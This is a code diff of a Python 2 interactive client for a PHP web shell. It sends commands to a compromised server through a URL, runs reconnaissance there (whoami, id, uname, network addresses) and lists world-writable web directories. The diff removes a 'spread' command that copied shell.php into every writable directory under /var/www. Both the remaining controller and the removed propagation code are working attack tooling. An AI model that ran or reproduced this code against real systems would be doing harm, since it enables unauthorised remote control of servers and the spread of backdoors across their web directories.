@@ -15,19 +15,13 @@ See the GNU General Public License for more details.
 from sys import argv
 from urllib2 import urlopen, quote, URLError, HTTPError
 from subprocess import Popen
-try:
-    import readline
-except ImportError:
-    print '\n[!] readline module is required to handle the shell environment'
-else:
-    pass
+import readline
 
 class Commander(object):
     def __init__(self, url=None):
         self.url = url
         self.source = None
         self.info = None
-        self.writeables = None
         self.cmd = 'whoami;id;uname -a;pwd;/sbin/ifconfig |grep -B1 "inet addr" |awk \'{ if ( $1 == "inet" ) { print $2 } else if ( $2 == "Link" ) { printf "%s:" ,$1 } }\' |awk -F: \'{ print $3 }\''.replace(' ','%20')
 
     # defining static methods
@@ -54,7 +48,7 @@ class Commander(object):
             local_ip = (urlopen('http://ifconfig.me/ip').read()).strip()
         except URLError:
             local_ip = 'Unknown'
-        available_commands = ['exit', 'clear', 'history', 'info', 'banner', 'writable', 'spread']
+        available_commands = ['exit', 'clear', 'history', 'info', 'banner', 'writable']
         self.info = \
         '''
         %s
@@ -77,7 +71,7 @@ class Commander(object):
         while True:
             try:
                 try:
-                    command = quote(raw_input('%s\033[91m@\033[0m\033[92m%s\033[0m:~\033[93m(%s)\033[0m-$ ' % (self.source[0], self.source[4], self.source[3])))
+                    command = raw_input('%s\033[91m@\033[0m\033[92m%s\033[0m:~\033[93m(%s)\033[0m-$ ' % (self.source[0], self.source[4], self.source[3])).replace(' ', '%20')
                 except IndexError:
                     command = raw_input('icommand\033[91m@\033[0m\033[92mserver:$ ')
                 history.append(quote(command))
@@ -97,13 +91,9 @@ class Commander(object):
                         print Commander.banner()
                     elif command == 'writable':
                         self.cmd = quote("find /var/www/ -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print")
-                        self.writeables = writeables = map(str.strip, urlopen('%s%s' % (self.url, self.cmd)).readlines())
-                        for path in writeables:
-                            print path
-                    elif command == 'spread':
-                        self.cmd = quote('find /var/www -xdev -type d \( -perm -0002 -a ! -perm -1000 \) | xargs -n 1 cp shell.php')
-                        urlopen('%s%s' % (self.url, self.cmd))
-                        print '[+] Successfully wrote %s to %d directory\n[+] Type writeable to check dirs' % (argv[0], len(self.writeables))
+                        source = map(str.strip, urlopen('%s%s' % (self.url, self.cmd)).readlines())
+                        for y in source:
+                            print y
                     else:
                         source = urlopen('%s%s' % (self.url, command)).read()
                         if source:
